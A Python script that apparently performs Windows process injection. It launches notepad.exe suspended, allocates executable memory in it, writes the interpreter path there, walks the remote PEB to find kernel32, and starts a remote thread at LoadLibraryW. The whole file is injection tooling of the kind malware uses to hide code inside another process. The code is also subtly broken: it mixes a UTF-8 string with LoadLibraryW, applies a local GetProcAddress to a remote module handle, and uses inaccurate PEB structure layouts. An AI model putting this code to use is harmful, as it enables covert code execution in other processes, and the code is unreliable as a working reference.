import ctypes
import subprocess
import sys
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
psapi = ctypes.windll.psapi
ntdll = ctypes.WinDLL("ntdll")
kernel32 = ctypes.WinDLL("kernel32")

CREATE_SUSPENDED = 0x00000004
PROCESS_ALL_ACCESS = 0x1F0FFF


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", ctypes.c_void_p),
        ("PebBaseAddress", ctypes.c_void_p),  # Ensure 64-bit pointer
        ("Reserved2", ctypes.c_void_p * 2),
        ("UniqueProcessId", ctypes.c_ulonglong),  # 64-bit process ID
        ("Reserved3", ctypes.c_void_p),
    ]


def start_suspended_process(target_exe):
    startupinfo = STARTUPINFO()
    startupinfo.cb = ctypes.sizeof(STARTUPINFO)

    process_info = PROCESS_INFORMATION()

    success = kernel32.CreateProcessW(
        target_exe,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startupinfo),
        ctypes.byref(process_info),
    )

    if not success:
        print("[ERROR] Failed to start target process in suspended state.")
        return None, None

    print("[+] Started target process in suspended state.")

    return process_info.hProcess, process_info.hThread


def get_remote_module_handle(process_handle, module_name):
    """Retrieve the base address of a module in a remote process using NtQueryInformationProcess."""
    ProcessBasicInfo = 0
    pbi = PROCESS_BASIC_INFORMATION()
    pbi_size = ctypes.sizeof(pbi)

    # Query process information
    status = ntdll.NtQueryInformationProcess(process_handle, ProcessBasicInfo, ctypes.byref(pbi), pbi_size, None)
    if status != 0:
        print("[ERROR] Failed to query process information.")
        return None

    # Get PEB base address
    peb_address = pbi.PebBaseAddress
    if not peb_address:
        print("[ERROR] Failed to retrieve PEB address.")
        return None

    # Define PEB structure
    class PEB(ctypes.Structure):
        _fields_ = [
            ("Reserved1", ctypes.c_byte * 2),
            ("BeingDebugged", ctypes.c_byte),
            ("Reserved2", ctypes.c_byte),
            ("Ldr", ctypes.c_void_p),  # Pointer to PEB_LDR_DATA
        ]

    peb = PEB()
    bytes_read = ctypes.c_size_t()

    # Read PEB structure from remote process
    if not kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(peb_address), ctypes.byref(peb), ctypes.sizeof(peb), ctypes.byref(bytes_read)):
        print("[ERROR] Failed to read PEB from remote process.")
        return None

    # Get address of PEB_LDR_DATA
    ldr_address = peb.Ldr
    if not ldr_address:
        print("[ERROR] Failed to retrieve LDR address from PEB.")
        return None

    # Define PEB_LDR_DATA structure
    class PEB_LDR_DATA(ctypes.Structure):
        _fields_ = [
            ("Length", ctypes.c_ulong),
            ("Initialized", ctypes.c_byte),
            ("SsHandle", ctypes.c_void_p),
            ("InLoadOrderModuleList", ctypes.c_void_p),  # First entry in module list
        ]

    ldr_data = PEB_LDR_DATA()

    # Read PEB_LDR_DATA from remote process
    if not kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(ldr_address), ctypes.byref(ldr_data), ctypes.sizeof(ldr_data), ctypes.byref(bytes_read)):
        print("[ERROR] Failed to read PEB_LDR_DATA.")
        return None

    # Read first module in list
    module_list_entry = ldr_data.InLoadOrderModuleList

    # Define LDR_MODULE structure
    class LDR_MODULE(ctypes.Structure):
        _fields_ = [
            ("Reserved1", ctypes.c_void_p * 2),
            ("InMemoryOrderLinks", ctypes.c_void_p * 2),
            ("BaseAddress", ctypes.c_void_p),
            ("EntryPoint", ctypes.c_void_p),
            ("SizeOfImage", ctypes.c_ulong),
            ("FullDllName", ctypes.c_wchar_p),  # Unicode string
            ("BaseDllName", ctypes.c_wchar_p),  # Unicode string
        ]

    while module_list_entry:
        module_entry = LDR_MODULE()

        # Read module entry from remote process
        if not kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(module_list_entry), ctypes.byref(module_entry), ctypes.sizeof(module_entry), ctypes.byref(bytes_read)):
            print("[ERROR] Failed to read module entry.")
            return None

        # Check if this is the module we're looking for
        if module_entry.BaseDllName and module_name.lower() in module_entry.BaseDllName.lower():
            return module_entry.BaseAddress

        # Move to the next module in the list
        module_list_entry = module_entry.InMemoryOrderLinks[0]

    print(f"[ERROR] {module_name} not found in remote process.")
    return None


def inject_python_into_explorer(process_handle):
    python_exe = sys.executable.encode("utf-8")
    python_size = len(python_exe) + 1

    alloc_address = kernel32.VirtualAllocEx(
        process_handle, None, python_size, 0x3000, 0x40
    )

    if not alloc_address:
        print("[ERROR] Memory allocation failed.")
        return False

    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        process_handle, alloc_address, python_exe, python_size, ctypes.byref(written)
    )

    print("[+] Injected Python path into explorer.exe memory.")

    # Get kernel32 handle in target process
    kernel32_handle = get_remote_module_handle(process_handle, "kernel32.dll")
    if not kernel32_handle:
        print("[ERROR] Kernel32.dll not found in remote process.")
        return False

    # Get the address of LoadLibraryW (Unicode version is more stable)
    load_library_addr = kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryW")
    if not load_library_addr:
        print("[ERROR] Failed to locate LoadLibraryW in remote process.")
        return False

    thread_handle = kernel32.CreateRemoteThread(
        process_handle, None, 0, load_library_addr, alloc_address, 0, None
    )

    if not thread_handle:
        print("[ERROR] Failed to create remote thread.")
        return False

    print("[+] Successfully injected Python execution into {target_process}")
    return True


def main():
    # target_process = "C:\\Windows\\explorer.exe"
    target_process = "C:\\Windows\\System32\\notepad.exe"

    process_handle, thread_handle = start_suspended_process(target_process)

    if not process_handle:
        return

    success = inject_python_into_explorer(process_handle)

    if success:
        kernel32.ResumeThread(thread_handle)


if __name__ == "__main__":
    main()
